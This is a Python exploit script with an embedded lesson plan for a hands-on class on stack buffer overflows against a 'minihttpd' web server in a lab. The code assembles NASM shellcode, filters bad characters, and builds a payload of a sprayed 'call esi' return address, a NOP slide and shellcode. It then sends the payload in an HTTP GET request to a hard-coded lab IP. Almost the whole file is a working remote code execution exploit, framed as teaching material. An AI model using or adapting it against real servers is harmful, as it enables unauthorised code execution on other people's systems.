
import socket
import struct
import os

def p32(i):
	return struct.pack("<i", i)

"""

Lesson Plan:
Prepare: download webenv, x32dbg, exploit.py, shellcode.asm, shellcode_message_box.asm from git
0. go over code explain
	spamming the return address to jump-esi
	esi points to our buffer but not sure where
	make nop slide
	actual shellcode
	exploit = spammed return address + nop slide + actual shellcode
1. do first mission together (get this exploit working)
2. review what happened
	it compiled our code
	created payload, and sent it
3. start 2nd mission together (problematic to put spaces)
	show what happens when we have a bad char
	explain that they need to be creative how to put a space because can't use certain chars (ask to throw ideas: adding, xoring, shl, anything)
	*MENTION THAT I DIDNT FIND ALL THE BAD CHARS
	show can put "db 0xcc" so the debugger will stop when it reaches that opcode
4. send off for good luck!


To get this exploit working:

	1. update the IP parameter to the target server
	2. start the webserver (double click)
	3. open x32 debugger (after downloading from https://github.com/x64dbg/x64dbg/releases -> run releases/x32/x32dbg.exe)
	4. attach (file > attach) to minihttpd
	5. in the command line, at the bottom of x32dbg, enter: findallmem 0x50aaaaaa, ffd6
	6. open the "references" tab in the debugger
	7. copy the first address (right-click > copy > address) into the 'return_address' parameter
	8. run this code

Tasks:
1. 	Follow above instructions to print "hacked!" on the webserver cmd screen
2. 	Edit "shellcode.asm" so that it will write "hacked by yyyy" where yyyy is your name! :)
3. 	Run "shellcode_message_box.asm" (copy paste the code into "shellcode.asm")
4.  Edit the code to print something cooler
5.  Have fun, be creating with what you can do!

"""

def hack(ip, return_address):
	"""Step 1. Compile shellcode"""
	asm_path = "shellcode.asm"
	shellcode_path = "shellcode.bin"
	listfile_path = "out.txt"

	try:
		os.unlink(shellcode_path)
		os.unlink(listfile_path)
	except Exception as e:
		pass

	compile_line = "nasm "+asm_path+" -o "+shellcode_path+" -l "+listfile_path
	os.system(compile_line)

	if not os.path.exists(shellcode_path):
		print("Error compiling shellcode. Please see errors above.")
		return
	else:
		print("Successfully compiled shellcode")
	shellcode = open("shellcode.bin", "rb").read()

	"""Step 2. Check shellcode"""
	bad_chars = b" \r\n\x00" # chars that will ruin the vulnerability and aren't allowed to be in the shellcode
	have_bad_chars = False
	for bad_char in bad_chars:
		if bad_char in shellcode:
			print("CRITICAL ERROR! Found bad char '{}' in shellcode. Try changing assembly to generate the same affect in a different way".format(bad_char.encode("hex")))
			have_bad_chars = True

	if have_bad_chars:
		print("compiled assembly:")
		asm_with_hex = open(listfile_path, "rb").read()
		asm_with_hex_lines = asm_with_hex.split("\r\n")
		for line in asm_with_hex_lines:
			words = line.split()
			if len(words) < 3:
				asm_hex = ""
			else:
				# find the bytes of the assembly and then split into groups of 2
				asm_hex = words[2]
				temp = []
				for i in range(0, len(asm_hex), 2):
					temp.append(asm_hex[i:i+2])
				asm_hex = temp

			for bad_char in bad_chars:
				if bad_char.encode("hex") in asm_hex:
					# line with a bad char :/
					print(line)
					print("               ^This line has the bad character '{}' :(. Try changing assembly to generate the same affect in a different way.".format(bad_char.encode("hex")))
					break
			else:
				print(line)
		return

	# return_address needs to point to 'call esi'
	nop_slide = b"\x90" * 200
	exploit =  b"AA" + 1370*return_address  + nop_slide + shellcode

	"""Step 3. Send attack"""
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ip, 80))
	except Exception as e:
		print("error connecting to ip {}. Is this the correct ip?\nError:".format(ip))
		print(e)
		return

	buf = (
		b"GET /" + exploit + b" HTTP/1.1\r\n" + 
		b"Host: " + ip +
		b"\r\n\r\n"
	)

	print("Sending exploit. Length", len(exploit))
	s.send(buf)
	s.close()


if __name__ == '__main__':
	hack(ip="192.168.140.129", return_address=p32(0x6F8C4BEF))


